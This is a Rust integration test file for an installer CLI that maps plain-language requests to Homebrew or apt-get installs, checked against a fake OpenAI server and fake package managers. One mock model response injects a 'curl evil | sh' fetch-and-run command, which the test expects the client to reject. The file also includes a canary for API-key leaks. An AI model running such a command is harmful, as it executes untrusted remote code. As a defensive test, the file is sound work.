//! Integration and CLI boundary tests for the Ultimate Installer.
//!
//! Exercises:
//! - Real system context probing & state hashing
//! - CLI boundary flows with disposable fake package-manager binaries (dry run, approval,
//!   rejection, empty input, EOF, unsupported input, successful install, partial failure + retry,
//!   repeat run with nothing to install, Ubuntu sudo + apt-get + fdfind flow, missing prerequisites)
//! - OpenAI provider client against a local HTTP test double (auth header verification,
//!   structured output validation, error handling, secret redaction, and child env isolation)

use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;

use ultimate_installer::auth::{self, ResolvedKey};
use ultimate_installer::context;
use ultimate_installer::openai::{OpenAiClient, ProviderDecision, ProviderError};

#[test]
fn context_probe_returns_valid_state() {
    let state = context::probe("integration_test".into());

    assert_eq!(state.intent, "integration_test");
    assert!(!state.os.is_empty(), "OS detection must return something");
    assert!(
        !state.arch.is_empty(),
        "arch detection must return something"
    );
    assert!(
        state.errors_encountered.is_empty(),
        "fresh state has no errors"
    );

    let fp = state.fingerprint();
    assert!(fp.contains("integration_test"));
}

#[test]
fn cold_start_detection_works() {
    let _has_keys = auth::has_any_api_key();
}

#[test]
fn hash_of_probed_state_is_deterministic() {
    let state = context::probe("hash_test".into());
    let h1 = ultimate_installer::hash::hash_state(&state);
    let h2 = ultimate_installer::hash::hash_state(&state);
    assert_eq!(h1, h2, "hash of probed state must be deterministic");
}

/// Spawn a minimal single-request HTTP/1.1 test double on loopback and return its URL and a
/// receiver for the captured raw HTTP request.
async fn spawn_mock_openai_server(
    status_line: &'static str,
    response_body: String,
) -> (String, tokio::sync::oneshot::Receiver<String>) {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let (tx, rx) = tokio::sync::oneshot::channel();

    tokio::spawn(async move {
        if let Ok((mut socket, _)) = listener.accept().await {
            let mut buf = vec![0u8; 16384];
            let mut raw = Vec::new();
            loop {
                match socket.read(&mut buf).await {
                    Ok(0) => break,
                    Ok(n) => {
                        raw.extend_from_slice(&buf[..n]);
                        let text = String::from_utf8_lossy(&raw);
                        if let Some(header_end) = text.find("\r\n\r\n") {
                            let headers = &text[..header_end];
                            let content_len = headers
                                .lines()
                                .find_map(|line| {
                                    let lower = line.to_ascii_lowercase();
                                    lower
                                        .strip_prefix("content-length:")
                                        .and_then(|v| v.trim().parse::<usize>().ok())
                                })
                                .unwrap_or(0);
                            let body_len = raw.len().saturating_sub(header_end + 4);
                            if body_len >= content_len {
                                break;
                            }
                        }
                    }
                    Err(_) => break,
                }
            }
            let _ = tx.send(String::from_utf8_lossy(&raw).to_string());

            let http_resp = format!(
                "HTTP/1.1 {status_line}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
            let _ = socket.write_all(http_resp.as_bytes()).await;
            let _ = socket.shutdown().await;
        }
    });

    (format!("http://{addr}/v1/chat/completions"), rx)
}

#[tokio::test]
async fn openai_client_sends_auth_header_and_validates_structured_output() {
    let fake_key = "sk-fake-provider-key-000111222";
    let body = serde_json::json!({
        "choices": [{
            "message": {
                "content": "{\"intent\":\"install\",\"tools\":[\"ripgrep\",\"fd\"],\"reason\":\"Text search and file finder\"}"
            }
        }]
    })
    .to_string();

    let (url, req_rx) = spawn_mock_openai_server("200 OK", body).await;

    let client = OpenAiClient::with_config(
        ResolvedKey {
            api_key: fake_key.to_string(),
            source: "test".to_string(),
        },
        url,
        "gpt-4o-mini".to_string(),
        Duration::from_secs(5),
        true,
    )
    .unwrap();

    let decision = client
        .resolve_intent("Set me up with ripgrep for searching text and fd for finding files")
        .await
        .unwrap();

    match decision {
        ProviderDecision::Install(tools) => {
            let ids: Vec<&str> = tools.iter().map(|t| t.id).collect();
            assert_eq!(ids, vec!["ripgrep", "fd"]);
        }
        other => panic!("expected Install decision, got {other:?}"),
    }

    let raw_request = req_rx.await.unwrap();
    let lower_req = raw_request.to_ascii_lowercase();
    assert!(
        lower_req.contains(&format!(
            "authorization: bearer {}",
            fake_key.to_ascii_lowercase()
        )),
        "request must include expected Bearer auth header"
    );
    assert!(
        raw_request.contains("json_schema"),
        "request must use structured output json_schema"
    );
}

#[tokio::test]
async fn openai_client_distinguishes_auth_rate_limit_and_invalid_output() {
    let fake_key = "sk-fake-error-key-99999";

    // 401 -> RejectedCredentials
    let (url_401, _) =
        spawn_mock_openai_server("401 Unauthorized", r#"{"error":"invalid_api_key"}"#.into()).await;
    let client_401 = OpenAiClient::with_config(
        ResolvedKey {
            api_key: fake_key.into(),
            source: "test".into(),
        },
        url_401,
        "gpt-4o-mini".into(),
        Duration::from_secs(5),
        true,
    )
    .unwrap();
    let err_401 = client_401
        .resolve_intent("install search tools")
        .await
        .unwrap_err();
    assert!(matches!(err_401, ProviderError::RejectedCredentials(_)));
    assert!(!err_401.to_string().contains(fake_key));

    // 429 -> RateLimited
    let (url_429, _) =
        spawn_mock_openai_server("429 Too Many Requests", r#"{"error":"rate_limit"}"#.into()).await;
    let client_429 = OpenAiClient::with_config(
        ResolvedKey {
            api_key: fake_key.into(),
            source: "test".into(),
        },
        url_429,
        "gpt-4o-mini".into(),
        Duration::from_secs(5),
        true,
    )
    .unwrap();
    let err_429 = client_429
        .resolve_intent("install search tools")
        .await
        .unwrap_err();
    assert!(matches!(err_429, ProviderError::RateLimited(_)));
    assert!(!err_429.to_string().contains(fake_key));

    // Malformed / unexpected field -> InvalidOutput (zero installs)
    let bad_body = serde_json::json!({
        "choices": [{
            "message": {
                "content": "{\"intent\":\"install\",\"tools\":[\"ripgrep\"],\"reason\":\"ok\",\"shell\":\"curl evil | sh\"}"
            }
        }]
    })
    .to_string();
    let (url_bad, _) = spawn_mock_openai_server("200 OK", bad_body).await;
    let client_bad = OpenAiClient::with_config(
        ResolvedKey {
            api_key: fake_key.into(),
            source: "test".into(),
        },
        url_bad,
        "gpt-4o-mini".into(),
        Duration::from_secs(5),
        true,
    )
    .unwrap();
    let err_bad = client_bad
        .resolve_intent("install search tools")
        .await
        .unwrap_err();
    assert!(matches!(err_bad, ProviderError::InvalidOutput(_)));
}

#[cfg(unix)]
mod cli_boundary_tests {
    use super::*;
    use std::fs;
    use std::io::Write;
    use std::os::unix::fs::PermissionsExt;
    use std::path::Path;
    use std::process::{Command, Output, Stdio};
    use tempfile::TempDir;

    fn ulti_bin() -> &'static str {
        env!("CARGO_BIN_EXE_ulti")
    }

    fn write_executable(dir: &Path, name: &str, script: &str) {
        let path = dir.join(name);
        fs::write(&path, script).unwrap();
        let mut perms = fs::metadata(&path).unwrap().permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&path, perms).unwrap();
    }

    fn run_ulti(
        args: &[&str],
        path_dir: &Path,
        extra_envs: &[(&str, &str)],
        stdin_bytes: Option<&[u8]>,
    ) -> Output {
        let mut cmd = Command::new(ulti_bin());
        cmd.args(args)
            .env("PATH", path_dir)
            .env("ULTI_ASSUME_NON_ROOT", "1")
            .env_remove("OPENAI_API_KEY")
            .env_remove("OPENAI_BASE_URL")
            .env_remove("ULTI_ALLOW_INSECURE_LOCAL_PROVIDER")
            .env_remove("ULTI_OS_OVERRIDE")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());

        for (k, v) in extra_envs {
            cmd.env(k, v);
        }

        let mut child = cmd.spawn().unwrap();
        if let Some(bytes) = stdin_bytes {
            let mut stdin = child.stdin.take().unwrap();
            stdin.write_all(bytes).unwrap();
        } else {
            // Drop stdin immediately to simulate EOF
            drop(child.stdin.take());
        }
        child.wait_with_output().unwrap()
    }

    /// Create a fake `brew` binary that logs every invocation (and whether OPENAI_API_KEY leaked)
    /// and optionally creates fake `rg` / `fd` binaries in the same temp directory.
    fn install_fake_brew(bin_dir: &Path, log_file: &Path, env_log: &Path, mode: &str) {
        let script = format!(
            r#"#!/bin/sh
echo "brew $*" >> "{log}"
if [ -n "$OPENAI_API_KEY" ]; then
  echo "LEAKED:$OPENAI_API_KEY" >> "{env_log}"
else
  echo "CLEAN_ENV" >> "{env_log}"
fi

MODE="{mode}"
for arg in "$@"; do
  if [ "$arg" = "ripgrep" ]; then
    if [ "$MODE" = "success" ] || [ "$MODE" = "partial_rg_only" ]; then
      printf '#!/bin/sh\necho "ripgrep 14.1.0 (fake)"\n' > "{dir}/rg"
      /bin/chmod +x "{dir}/rg"
    fi
  elif [ "$arg" = "fd" ]; then
    if [ "$MODE" = "success" ]; then
      printf '#!/bin/sh\necho "fd 10.2.0 (fake)"\n' > "{dir}/fd"
      /bin/chmod +x "{dir}/fd"
    fi
  fi
done

if [ "$MODE" = "partial_rg_only" ]; then
  echo "Error: simulated failure installing fd" >&2
  exit 1
fi
exit 0
"#,
            log = log_file.display(),
            env_log = env_log.display(),
            dir = bin_dir.display(),
            mode = mode
        );
        write_executable(bin_dir, "brew", &script);
    }

    /// Create fake `sudo` and `apt-get` binaries for Ubuntu testing.
    fn install_fake_ubuntu_apt(bin_dir: &Path, log_file: &Path) {
        let sudo_script = format!(
            r#"#!/bin/sh
echo "sudo $*" >> "{log}"
exec "$@"
"#,
            log = log_file.display()
        );
        write_executable(bin_dir, "sudo", &sudo_script);

        let apt_script = format!(
            r#"#!/bin/sh
echo "apt-get $*" >> "{log}"
for arg in "$@"; do
  if [ "$arg" = "ripgrep" ]; then
    printf '#!/bin/sh\necho "ripgrep 14.1.0 (ubuntu-fake)"\n' > "{dir}/rg"
    /bin/chmod +x "{dir}/rg"
  elif [ "$arg" = "fd-find" ]; then
    printf '#!/bin/sh\necho "fdfind 9.0.0 (ubuntu-fake)"\n' > "{dir}/fdfind"
    /bin/chmod +x "{dir}/fdfind"
  fi
done
exit 0
"#,
            log = log_file.display(),
            dir = bin_dir.display()
        );
        write_executable(bin_dir, "apt-get", &apt_script);
    }

    #[test]
    fn cli_dry_run_previews_without_running_installer() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        let out = run_ulti(
            &["install ripgrep and fd", "--dry-run"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            None,
        );

        assert!(out.status.success());
        let stdout = String::from_utf8_lossy(&out.stdout);
        assert!(stdout.contains("brew install ripgrep fd"));
        assert!(stdout.contains("Dry run complete"));
        assert!(
            !log_file.exists(),
            "dry-run must not execute package manager"
        );
    }

    #[test]
    fn cli_rejection_empty_input_and_eof_stop_without_installing() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        // Explicit 'n'
        let out_n = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"n\n"),
        );
        assert!(!out_n.status.success());
        assert!(String::from_utf8_lossy(&out_n.stdout).contains("Installation cancelled"));

        // Empty input
        let out_empty = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"\n"),
        );
        assert!(!out_empty.status.success());

        // EOF
        let out_eof = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            None,
        );
        assert!(!out_eof.status.success());

        assert!(
            !log_file.exists(),
            "rejected, empty, or EOF runs must never execute package manager"
        );
    }

    #[test]
    fn cli_unsupported_input_produces_zero_installs() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        let out = run_ulti(
            &["install ripgrep and htop"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );

        assert!(!out.status.success());
        let stderr = String::from_utf8_lossy(&out.stderr);
        assert!(stderr.contains("Unsupported package(s): htop"));
        assert!(
            !log_file.exists(),
            "unsupported request must produce zero installs"
        );
    }

    #[test]
    fn cli_successful_install_and_repeat_run_with_nothing_to_install() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        // Run 1: approve install
        let out1 = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );
        assert!(
            out1.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&out1.stderr)
        );
        let stdout1 = String::from_utf8_lossy(&out1.stdout);
        assert!(stdout1.contains("ripgrep 14.1.0 (fake)"));
        assert!(stdout1.contains("fd 10.2.0 (fake)"));

        let logged = fs::read_to_string(&log_file).unwrap();
        assert_eq!(logged.trim(), "brew install ripgrep fd");

        // Run 2: repeat request with EOF stdin (must exit 0 without prompting or running brew)
        let out2 = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            None,
        );
        assert!(out2.status.success());
        let stdout2 = String::from_utf8_lossy(&out2.stdout);
        assert!(stdout2.contains("All requested tools are already installed"));
        assert!(stdout2.contains("Nothing to install"));

        let logged_after = fs::read_to_string(&log_file).unwrap();
        assert_eq!(
            logged_after.lines().count(),
            1,
            "repeat run must not invoke package manager again"
        );
    }

    #[test]
    fn cli_partial_failure_and_retry_installs_only_remaining_tool() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "partial_rg_only");

        // Run 1: partial failure (rg installs, fd fails)
        let out1 = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );
        assert!(!out1.status.success());
        let stdout1 = String::from_utf8_lossy(&out1.stdout);
        let stderr1 = String::from_utf8_lossy(&out1.stderr);
        assert!(stdout1.contains("ripgrep 14.1.0 (fake)"));
        assert!(stderr1.contains("fd"));

        // Run 2: switch brew to succeed; retry should plan ONLY fd
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");
        let out2 = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );
        assert!(out2.status.success());
        let stdout2 = String::from_utf8_lossy(&out2.stdout);
        assert!(stdout2.contains("Already installed:"));
        assert!(stdout2.contains("brew install fd"));
        assert!(stdout2.contains("fd 10.2.0 (fake)"));

        let lines: Vec<String> = fs::read_to_string(&log_file)
            .unwrap()
            .lines()
            .map(ToString::to_string)
            .collect();
        assert_eq!(lines, vec!["brew install ripgrep fd", "brew install fd"]);
    }

    #[test]
    fn cli_ubuntu_flow_uses_sudo_apt_get_fd_find_and_prints_fdfind_note() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("ubuntu.log");
        install_fake_ubuntu_apt(tmp.path(), &log_file);

        let out = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "ubuntu")],
            Some(b"y\n"),
        );
        assert!(
            out.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        let stdout = String::from_utf8_lossy(&out.stdout);
        assert!(stdout.contains("sudo apt-get install -y ripgrep fd-find"));
        assert!(stdout.contains("fdfind"));
        assert!(stdout.contains("ripgrep 14.1.0 (ubuntu-fake)"));
        assert!(stdout.contains("fdfind 9.0.0 (ubuntu-fake)"));

        let logged = fs::read_to_string(&log_file).unwrap();
        assert!(logged.contains("sudo apt-get install -y ripgrep fd-find"));
        assert!(logged.contains("apt-get install -y ripgrep fd-find"));
    }

    #[test]
    fn cli_missing_prerequisite_and_windows_explain_requirements() {
        let tmp = TempDir::new().unwrap();

        let out_missing_brew = run_ulti(
            &["install ripgrep"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            None,
        );
        assert!(!out_missing_brew.status.success());
        assert!(String::from_utf8_lossy(&out_missing_brew.stderr).contains("Homebrew"));

        let out_windows = run_ulti(
            &["install ripgrep"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "windows")],
            None,
        );
        assert!(!out_windows.status.success());
        let stderr_win = String::from_utf8_lossy(&out_windows.stderr);
        assert!(stderr_win.contains("Windows"));
        assert!(stderr_win.contains("macOS"));
        assert!(stderr_win.contains("Ubuntu"));
    }

    #[tokio::test]
    async fn cli_descriptive_request_uses_provider_redacts_key_and_strips_child_env() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        let fake_key = "sk-cli-secret-must-never-leak-77777";
        let body = serde_json::json!({
            "choices": [{
                "message": {
                    "content": "{\"intent\":\"install\",\"tools\":[\"ripgrep\",\"fd\"],\"reason\":\"Matched catalog\"}"
                }
            }]
        })
        .to_string();

        let (url, req_rx) = spawn_mock_openai_server("200 OK", body).await;

        let path_buf = tmp.path().to_path_buf();
        let out = tokio::task::spawn_blocking(move || {
            run_ulti(
                &["Set me up with ripgrep for searching text and fd for finding files"],
                &path_buf,
                &[
                    ("ULTI_OS_OVERRIDE", "macos"),
                    ("OPENAI_API_KEY", fake_key),
                    ("OPENAI_BASE_URL", &url),
                    ("ULTI_ALLOW_INSECURE_LOCAL_PROVIDER", "1"),
                ],
                Some(b"y\n"),
            )
        })
        .await
        .unwrap();

        assert!(
            out.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&out.stderr)
        );

        let stdout = String::from_utf8_lossy(&out.stdout);
        let stderr = String::from_utf8_lossy(&out.stderr);
        assert!(stdout.contains("brew install ripgrep fd"));
        assert!(stdout.contains("ripgrep 14.1.0 (fake)"));
        assert!(stdout.contains("fd 10.2.0 (fake)"));
        assert!(
            !stdout.contains(fake_key),
            "stdout must never contain API key"
        );
        assert!(
            !stderr.contains(fake_key),
            "stderr must never contain API key"
        );

        let env_report = fs::read_to_string(&env_log).unwrap();
        assert_eq!(
            env_report.trim(),
            "CLEAN_ENV",
            "child process must never receive OPENAI_API_KEY"
        );

        let raw_req = req_rx.await.unwrap();
        assert!(raw_req.to_ascii_lowercase().contains(&format!(
            "authorization: bearer {}",
            fake_key.to_ascii_lowercase()
        )));
    }

    #[test]
    fn cli_descriptive_request_without_key_reports_missing_key_and_does_nothing() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        let out = run_ulti(
            &["Set me up with ripgrep for searching text and fd for finding files"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );

        assert!(!out.status.success());
        let stderr = String::from_utf8_lossy(&out.stderr);
        assert!(stderr.contains("OPENAI_API_KEY"));
        assert!(!log_file.exists());
    }
}
